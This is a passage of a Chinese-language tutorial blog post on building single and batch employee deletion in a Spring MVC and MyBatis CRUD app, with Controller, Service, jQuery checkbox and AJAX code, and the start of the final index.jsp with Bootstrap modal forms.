<p>在Controller中添加<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp/&#123;id&#125;"</span>,method = RequestMethod.DELETE)</span><br><span class="line">public Msg deleteEmpById(<span class="variable">@PathVariable</span>(<span class="string">"id"</span>)Integer id)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.deleteEmp</span>(id);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Service:<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 员工删除</span></span><br><span class="line"><span class="comment"> * @param id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public void delete<span class="constructor">Emp(Integer <span class="params">id</span>)</span> &#123;</span><br><span class="line">    employeeMapper.delete<span class="constructor">ByPrimaryKey(<span class="params">id</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>给删除按钮添加自定义属性”del-id”</p>
<p>index.jsp：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单个删除</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".delete_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.弹出确认删除对话框</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(1)"</span>).text();</span><br><span class="line">    <span class="keyword">var</span> empId = $(<span class="keyword">this</span>).attr(<span class="string">"del-id"</span>);</span><br><span class="line">    <span class="comment">//alert($(this).parents("tr").find("td:eq(1)").text());</span></span><br><span class="line">    <span class="keyword">if</span>(confirm(<span class="string">"确认删除["</span>+empName+<span class="string">"]吗？"</span>))&#123;</span><br><span class="line">        <span class="comment">//确认，发送ajax请求删除即可</span></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">           url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+empId,</span><br><span class="line">            type:<span class="string">"DELETE"</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">                alert(result.msg);</span><br><span class="line">                <span class="comment">//回到本页</span></span><br><span class="line">                to_page(currentPage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>单个删除目前功能已经实现了</p>
<h2 id="多选删除"><a href="#多选删除" class="headerlink" title="多选删除"></a>多选删除</h2><p>表头需要一个checkbox</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;tr&gt;</span></span><br><span class="line">    <span class="symbol">&lt;th&gt;</span></span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"checkbox"</span> id=<span class="string">"check_all"</span>/&gt;</span><br><span class="line">    &lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>#&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>empName&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>gender&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>email&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>deptName&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>操作&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">tr</span>&gt;</span><br></pre></td></tr></table></figure>
<p>同时也要给他添加进遍历里<br><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">build_emps_tables</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//清空table</span></span><br><span class="line">    $(<span class="string">"#emps_table tbody"</span>).empty();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> emps=result.extend.pageInfo.list;</span><br><span class="line">    $.each(emps,<span class="function"><span class="keyword">function</span> (<span class="params">index,item</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> checkBoxTd = $(<span class="string">"&lt;td&gt;&lt;input type='checkbox' class='check_item' /&gt;&lt;/td&gt;"</span>);</span><br></pre></td></tr></table></figure></p>
<p>接着编写点击事件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//完成全选/全不选</span></span><br><span class="line">$(<span class="string">"#check_all"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//attr获取checked是undefined</span></span><br><span class="line">    <span class="comment">//我们这些dom原生的属性,attr获取自定义属性的值</span></span><br><span class="line">    <span class="comment">//prop修改和读取dom原生属性的值</span></span><br><span class="line">   $(<span class="string">".check_item"</span>).prop(<span class="string">"checked"</span>,$(<span class="keyword">this</span>).prop(<span class="string">"checked"</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断当前选择中的元素是否5个</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".check_item"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = $(<span class="string">".check_item:checked"</span>).length == $(<span class="string">".check_item"</span>).length;</span><br><span class="line">    $(<span class="string">"#check_all"</span>).prop(<span class="string">"checked"</span>,flag);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这样一个多选功能就完成了</p>
<p>为了增加代码复用，我们修改一下Controller<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 单个批量二合一</span></span><br><span class="line"><span class="comment"> * 批量删除：1-2-3</span></span><br><span class="line"><span class="comment"> * 单个删除：1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param ids</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@ResponseBody</span><br><span class="line">@<span class="constructor">RequestMapping(<span class="params">value</span> = <span class="string">"/emp/&#123;ids&#125;"</span>,<span class="params">method</span> = RequestMethod.DELETE)</span></span><br><span class="line">public Msg delete<span class="constructor">Emp(@PathVariable(<span class="string">"ids"</span>)</span>String ids)&#123;</span><br><span class="line">    <span class="comment">//批量删除</span></span><br><span class="line">    <span class="keyword">if</span>(ids.contains(<span class="string">"-"</span>))&#123;</span><br><span class="line">        List&lt;Integer&gt; del_ids = <span class="keyword">new</span> ArrayList&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">        String<span class="literal">[]</span> str_ids = ids.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="comment">//组装id的集合</span></span><br><span class="line">        for(String <span class="built_in">string</span> : str_ids)&#123;</span><br><span class="line">            del_ids.add(<span class="module-access"><span class="module"><span class="identifier">Integer</span>.</span></span>parse<span class="constructor">Int(<span class="params">string</span>)</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        employeeService.delete<span class="constructor">Batch(<span class="params">del_ids</span>)</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        Integer id = <span class="module-access"><span class="module"><span class="identifier">Integer</span>.</span></span>parse<span class="constructor">Int(<span class="params">ids</span>)</span>;</span><br><span class="line">        employeeService.delete<span class="constructor">Emp(<span class="params">id</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以及Service对应的方法<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">public void delete<span class="constructor">Batch(List&lt;Integer&gt; <span class="params">ids</span>)</span> &#123;</span><br><span class="line">    EmployeeExample example = <span class="keyword">new</span> <span class="constructor">EmployeeExample()</span>;</span><br><span class="line">    EmployeeExample.Criteria criteria = example.create<span class="constructor">Criteria()</span>;</span><br><span class="line">    <span class="comment">//delete from xxx where emp_id in(1,2,3)</span></span><br><span class="line">    criteria.<span class="keyword">and</span><span class="constructor">EmpIdIn(<span class="params">ids</span>)</span>;</span><br><span class="line">    employeeMapper.delete<span class="constructor">ByExample(<span class="params">example</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>index.jsp也简要修改<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击全部删除，就批量删除</span></span><br><span class="line">    $(<span class="string">"#emp_delete_all_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//$(".check_item:checked")</span></span><br><span class="line">        <span class="keyword">var</span> empNames = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">var</span> del_idstr = <span class="string">""</span>;</span><br><span class="line">        $.each($(<span class="string">".check_item:checked"</span>),<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="comment">//this</span></span><br><span class="line">            empNames += $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(2)"</span>).text()+<span class="string">"，"</span>;</span><br><span class="line">            <span class="comment">//组装员工id字符串</span></span><br><span class="line">            del_idstr += $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(1)"</span>).text()+<span class="string">"-"</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//去除empNames多余的,</span></span><br><span class="line">        empNames = empNames.substring(<span class="number">0</span>,empNames.length<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">//去除删除的id多余的-</span></span><br><span class="line">        del_idstr = del_idstr.substring(<span class="number">0</span>,del_idstr.length<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">"确认删除["</span>+empNames+<span class="string">"]吗？"</span>))&#123;</span><br><span class="line">            <span class="comment">//发送ajax请求</span></span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">               url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+del_idstr,</span><br><span class="line">               type:<span class="string">"DELETE"</span>,</span><br><span class="line">               success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>)</span>&#123;</span><br><span class="line">                   alert(result.msg);</span><br><span class="line">                   <span class="comment">//回到当前页面</span></span><br><span class="line">                   to_page(currentPage);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><br>这样就完成了一个多选删除的功能，单选删除也同样奏效</p>
<p>到这里整个的增删改查功能就全部做完了</p>
<p>最后的index.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 员工添加的模态框 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>员工添加<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                部门名称-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-员工修改的模态框-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empUpdateModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span>&gt;</span>员工修改<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-control-static"</span> <span class="attr">id</span>=<span class="string">"empName_update_static"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_update_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_update_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_update_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        